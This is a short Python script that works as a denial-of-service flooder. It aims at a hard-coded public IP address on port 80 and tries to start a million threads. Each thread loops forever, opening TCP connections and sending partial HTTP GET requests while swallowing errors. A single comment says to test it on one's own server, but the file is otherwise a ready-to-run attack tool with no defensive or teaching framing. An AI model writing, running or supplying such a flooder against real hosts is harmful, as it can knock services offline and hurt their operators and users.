import socket
import threading

target_ip = "88.99.61.148"  # Replace with target IP (Test on your own server)
target_port = 80  # Common ports: 80 (HTTP), 443 (HTTPS)

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            s.close()
        except:
            pass  # Prevent script from stopping if an error occurs

# Launch multiple threads
for _ in range(1000000):  # Adjust number of threads
    thread = threading.Thread(target=attack)
    thread.start()
